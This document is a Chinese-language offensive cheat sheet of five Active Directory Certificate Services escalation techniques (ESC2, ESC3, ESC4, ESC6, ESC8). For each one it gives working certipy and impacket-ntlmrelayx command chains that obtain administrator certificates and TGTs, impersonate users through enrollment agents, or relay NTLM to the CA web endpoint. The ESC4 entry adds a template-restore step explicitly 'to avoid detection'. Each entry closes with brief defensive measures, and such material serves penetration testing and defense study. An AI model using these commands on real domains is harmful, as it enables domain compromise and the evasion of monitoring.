# ADCS攻击

_5 条 intranet payload_

### ADCS ESC2攻击  `adcs-esc2`
_利用ESC2模板配置错误_
子类：**ESC2** · tags: `adcs` `esc2` `certificate`

**前置条件：**
- 域环境
- ADCS服务
- 存在ESC2模板

**攻击链：**

**探测ESC2模板**
> 探测ESC2模板
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找Any Purpose或CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT模板
```

**请求证书**
> 请求管理员证书
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -target DC_IP -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```
**语法解析：**
- `-template` — 指定易受攻击模板 _parameter_
- `-upn` — 指定目标用户UPN _parameter_

**使用证书认证**
> 使用证书认证
_platform: linux_
```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
获取管理员TGT
```


**概述：** ESC2允许请求任意用途的证书，可用于伪造任意用户身份。

**漏洞原理：** 证书模板配置允许Any Purpose扩展。

**利用方法：** 利用流程：1) 发现ESC2模板 2) 请求管理员证书 3) 使用证书认证

**防御措施：** 防御措施：1) 审计证书模板 2) 禁用Any Purpose 3) 监控证书请求

---

### ADCS ESC3攻击  `adcs-esc3`
_利用ESC3注册代理配置错误_
子类：**ESC3** · tags: `adcs` `esc3` `certificate`

**前置条件：**
- 域环境
- ADCS服务
- 存在ESC3配置

**攻击链：**

**探测ESC3**
> 探测ESC3配置
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找具有Enrollment Agent权限的模板
```

**获取注册代理证书**
> 获取注册代理证书
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template EnrollmentAgent
获取注册代理证书
```

**代表其他用户请求证书**
> 代表管理员请求证书
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -on-behalf-of DOMAIN\\Administrator -pfx agent.pfx
```
**语法解析：**
- `-on-behalf-of` — 代表其他用户请求 _parameter_
- `-pfx agent.pfx` — 使用代理证书 _parameter_


**概述：** ESC3允许注册代理代表其他用户请求证书。

**漏洞原理：** 证书模板允许注册代理功能。

**利用方法：** 利用流程：1) 获取代理证书 2) 代表管理员请求证书 3) 使用证书认证

**防御措施：** 防御措施：1) 限制注册代理权限 2) 审计代理证书 3) 监控异常请求

---

### ADCS ESC4攻击  `adcs-esc4`
_利用ESC4模板权限配置错误_
子类：**ESC4** · tags: `adcs` `esc4` `certificate`

**前置条件：**
- 域环境
- ADCS服务
- 对模板有写权限

**攻击链：**

**探测ESC4**
> 探测模板权限
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找用户有写权限的模板
```

**修改模板配置**
> 修改模板配置
_platform: linux_
```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -save-old
修改模板为ESC1配置
```

**请求证书**
> 请求管理员证书
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```
**语法解析：**
- `-save-old` — 保存原配置以便恢复 _parameter_
- `修改模板` — 启用SAN扩展 _keyword_

**恢复模板配置**
> 恢复模板配置
_platform: linux_
```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json
恢复原配置避免检测
```


**概述：** ESC4允许修改证书模板配置来提权。

**漏洞原理：** 用户对证书模板有写权限。

**利用方法：** 利用流程：1) 发现可写模板 2) 修改配置 3) 请求证书 4) 恢复配置

**防御措施：** 防御措施：1) 审计模板权限 2) 限制写权限 3) 监控模板修改

---

### ADCS ESC6攻击  `adcs-esc6`
_利用ESC6编辑标志配置错误_
子类：**ESC6** · tags: `adcs` `esc6` `certificate`

**前置条件：**
- 域环境
- ADCS服务
- CA启用EDITF_ATTRIBUTESUBJECTALTNAME2

**攻击链：**

**探测ESC6**
> 探测CA配置
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找EDITF_ATTRIBUTESUBJECTALTNAME2标志
```

**请求证书**
> 请求管理员证书
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com
使用-alt参数指定SAN
```
**语法解析：**
- `-alt` — 指定Subject Alternative Name _parameter_
- `EDITF_ATTRIBUTESUBJECTALTNAME2` — CA允许在请求中指定SAN _keyword_

**使用证书认证**
> 认证获取TGT
_platform: linux_
```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```


**概述：** ESC6允许在证书请求中指定任意SAN。

**漏洞原理：** CA配置了EDITF_ATTRIBUTESUBJECTALTNAME2标志。

**利用方法：** 利用流程：1) 探测CA配置 2) 请求带管理员SAN的证书 3) 认证

**防御措施：** 防御措施：1) 移除EDITF_ATTRIBUTESUBJECTALTNAME2标志 2) 监控证书请求 3) 审计CA配置

---

### ADCS ESC8攻击  `adcs-esc8`
_利用ESC8 HTTP端点进行NTLM中继_
子类：**ESC8** · tags: `adcs` `esc8` `ntlm-relay`

**前置条件：**
- 域环境
- ADCS HTTP端点
- 可触发NTLM认证

**攻击链：**

**探测ESC8**
> 探测HTTP端点
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找HTTP证书端点
```

**设置NTLM中继**
> 设置NTLM中继
_platform: linux_
```
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
监听NTLM认证并中继到ADCS
```
**语法解析：**
- `-t http://CA_SERVER` — 目标ADCS HTTP端点 _parameter_
- `--adcs` — 启用ADCS模板 _parameter_

**触发认证**
> 触发目标NTLM认证
```
使用多种方式触发:
- 发送邮件链接
- 打印机漏洞
- WebDAV
- 其他NTLM触发方式
```


**概述：** ESC8利用ADCS HTTP端点进行NTLM中继攻击。

**漏洞原理：** ADCS HTTP端点支持NTLM认证且未启用签名。

**利用方法：** 利用流程：1) 设置中继服务器 2) 触发目标认证 3) 获取证书

**防御措施：** 防御措施：1) 启用通道绑定 2) 禁用HTTP端点 3) 启用Extended Protection

---
